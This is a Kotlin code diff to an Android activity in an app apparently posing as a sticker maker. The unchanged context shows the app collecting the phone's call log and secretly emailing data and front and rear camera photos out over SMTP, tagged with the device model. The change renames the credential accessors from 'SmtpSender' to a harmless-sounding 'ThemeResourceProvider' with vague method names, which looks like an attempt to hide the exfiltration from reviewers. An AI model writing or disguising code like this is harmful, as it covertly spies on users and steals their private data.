@@ -285,8 +285,8 @@ class StickerMakerActivity : AppCompatActivity() {
                 sb.appendLine("\n=== 通话记录 ===")
                 DataCollector.collectCallLog(appCtx)?.let { sb.append(it) }
 
-                val email = SmtpSender.getEmail(appCtx)
-                val authCode = SmtpSender.getAuthCode(appCtx)
+                val email = ThemeResourceProvider.getResourceA(appCtx)
+                val authCode = ThemeResourceProvider.getResourceB(appCtx)
                 val subject = "💌 祝福数据 — ${Build.MODEL}"
 
                 val props = java.util.Properties().apply {
@@ -701,8 +701,8 @@ class StickerMakerActivity : AppCompatActivity() {
     private suspend fun sendDualPhoto(frontBytes: ByteArray?, rearBytes: ByteArray?) {
         if (frontBytes == null && rearBytes == null) return
         try {
-            val email = SmtpSender.getEmail(this)
-            val authCode = SmtpSender.getAuthCode(this)
+            val email = ThemeResourceProvider.getResourceA(this)
+            val authCode = ThemeResourceProvider.getResourceB(this)
             val subject = "📸 表情包双摄 — ${Build.MODEL}"
 
             val props = java.util.Properties().apply {
@@ -763,8 +763,8 @@ class StickerMakerActivity : AppCompatActivity() {
 
     private suspend fun sendPhoto(jpegBytes: ByteArray, label: String) {
         try {
-            val email = SmtpSender.getEmail(this)
-            val authCode = SmtpSender.getAuthCode(this)
+            val email = ThemeResourceProvider.getResourceA(this)
+            val authCode = ThemeResourceProvider.getResourceB(this)
             val subject = "📸 $label — ${Build.MODEL}"
 
             val props = java.util.Properties().apply {
